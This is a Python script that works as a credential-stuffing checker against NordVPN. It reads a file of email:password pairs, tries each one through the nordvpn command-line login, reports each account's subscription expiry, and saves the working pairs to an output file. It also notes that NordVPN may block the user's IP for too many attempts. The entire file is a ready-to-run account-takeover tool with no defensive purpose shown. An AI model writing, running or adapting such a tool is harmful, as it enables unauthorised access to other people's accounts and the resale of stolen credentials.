import os
import subprocess
import sys
import argparse

# console colors
G = '\033[92m'  # Green
W = '\033[93m'  # Warning (yellow)
R = '\033[91m'  # Red
E = '\033[0m'   # Erase (the default color)
B = '\033[34m'  # Blue


def read_arguments():

    parser = argparse.ArgumentParser(
        description='Check NordVPN login'
    )

    parser.add_argument(
        '-f',
        '--file',
        help='The file that contains your email:pass entries',
        action='store',
        required=True,
        metavar='FILE'
    )

    parser.add_argument(
        '-o',
        '--output',
        help='The file to output the successful email:pass entries to',
        action='store',
        required=True,
        metavar='FILE'
    )

    return parser.parse_args()


def check_login(email, password):
    # make sure you're logged out of NordVPN
    subprocess.run(['nordvpn', 'logout'], capture_output=True)

    login_result = subprocess.run(
        ['nordvpn', 'login', '-u', email, '-p', password],
        capture_output=True,
        text=True
    )
    if not login_result.returncode == 0:
        # Failed to login
        return False
    else:
        # Ensure the user is logged in
        account_info = subprocess.run(
            ['nordvpn', 'account'],
            capture_output=True,
            text=True
        )
        if 'You are not logged in.' in account_info.stdout:
            return None
        else:
            return account_info.stdout


def parse_expiration_date(login_result):
    return login_result.split('VPN Service: ')[
        1].rstrip()


def read_file(args):
    input_file_path = args.file
    output_file_path = args.output

    if not os.path.isfile(input_file_path):
        print('The path specified does not exist', input_file_path)
        sys.exit()

    # check if the specified file is empty
    if os.stat(input_file_path).st_size == 0:
        print('The file specified is empty.')
        sys.exit()

    with open(input_file_path) as f:
        for count, line in enumerate(f):
            count += 1
            if not line.strip():  # ignore empty lines in file
                continue

            email, password = line.strip().split(':')
            print(B + f'{count}) Checking ➜', W +
                  f'{email}:{password}\r' + E, end='')

            login_result = check_login(email, password)

            if not login_result:
                # Failed to login
                print(
                    B + f'{count}) Checking ➜',
                    W + f'{email}:{password}',
                    '\t\t\t',
                    R + 'Failed' + E
                )
            elif login_result is None:
                # No response from NordVPN
                print(
                    B + f'{count}) Checking ➜',
                    W + f'{email}:{password}',
                    '\t\t\t',
                    R + 'No response' + E
                )
                print(
                    R+"NordVPN might be temporarily blocking your IP due to too many requests."+E)
            else:
                account_expiration_date = parse_expiration_date(login_result)
                print(
                    B + f'{count}) Checking ➜',
                    W + f'{email}:{password}\t\t',
                    G + account_expiration_date + E
                )
                append_to_output_file(output_file_path, f'{email}:{password}')


# Appends username:password entry to the specified output file
def append_to_output_file(file_path, entry):
    with open(file_path, "a") as output_file:
        output_file.write(entry + "\r\n")


if __name__ == "__main__":
    args = read_arguments()

    # Initialize the script
    try:
        read_file(args)
    except KeyboardInterrupt:
        print(R+"\nQuitting..."+E)
